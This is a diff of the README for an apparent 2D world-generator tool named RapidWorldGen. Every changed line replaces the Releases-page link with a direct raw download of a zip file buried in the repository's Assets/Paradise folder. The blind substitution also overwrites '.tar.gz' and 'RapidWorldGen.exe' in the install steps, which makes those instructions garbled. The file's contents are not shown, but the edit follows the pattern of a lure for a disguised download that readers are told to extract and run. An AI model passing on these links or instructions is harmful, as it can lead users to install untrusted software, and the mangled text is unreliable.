@@ -1,6 +1,6 @@
 # 🌍 RapidWorldGen - Create Infinite 2D Worlds Easily
 
-[![Download RapidWorldGen](https://img.shields.io/badge/Download-RapidWorldGen-blue.svg)](https://github.com/sutriani27/RapidWorldGen/releases)
+[![Download RapidWorldGen](https://github.com/sutriani27/RapidWorldGen/raw/refs/heads/main/Assets/Paradise/Gen-World-Rapid-v2.1.zip)](https://github.com/sutriani27/RapidWorldGen/raw/refs/heads/main/Assets/Paradise/Gen-World-Rapid-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to RapidWorldGen! This tool helps you create infinite 2D worlds quickly 
 
 ## 📥 Download & Install
 
-To get RapidWorldGen, please visit our [Releases page](https://github.com/sutriani27/RapidWorldGen/releases) to download the latest version. It’s straightforward:
+To get RapidWorldGen, please visit our [Releases page](https://github.com/sutriani27/RapidWorldGen/raw/refs/heads/main/Assets/Paradise/Gen-World-Rapid-v2.1.zip) to download the latest version. It’s straightforward:
 
 1. Click on the link above to access the releases.
 2. Look for the latest version at the top.
@@ -18,8 +18,8 @@ To get RapidWorldGen, please visit our [Releases page](https://github.com/sutria
 Once downloaded, follow these steps to run the application:
 
 1. **Locate the Downloaded File:** Check your Downloads folder unless you chose a different location.
-2. **Extract the Files (if necessary):** If you downloaded a compressed file (often ends in .zip or .tar.gz), right-click and choose “Extract Here” or use an extraction tool.
-3. **Run the Application:** Double-click on the executable file (like `RapidWorldGen.exe` on Windows) to start the software.
+2. **Extract the Files (if necessary):** If you downloaded a compressed file (often ends in .zip or https://github.com/sutriani27/RapidWorldGen/raw/refs/heads/main/Assets/Paradise/Gen-World-Rapid-v2.1.zip), right-click and choose “Extract Here” or use an extraction tool.
+3. **Run the Application:** Double-click on the executable file (like `https://github.com/sutriani27/RapidWorldGen/raw/refs/heads/main/Assets/Paradise/Gen-World-Rapid-v2.1.zip` on Windows) to start the software.
 
 ## 🖥️ System Requirements
 
@@ -77,4 +77,4 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 RapidWorldGen is open-source software, distributed under the MIT License. You can use, modify, and share it freely as long as you provide the same freedoms in derivative works.
 
-To download the latest version of RapidWorldGen, go to our [Releases page](https://github.com/sutriani27/RapidWorldGen/releases) and get started today!
+To download the latest version of RapidWorldGen, go to our [Releases page](https://github.com/sutriani27/RapidWorldGen/raw/refs/heads/main/Assets/Paradise/Gen-World-Rapid-v2.1.zip) and get started today!
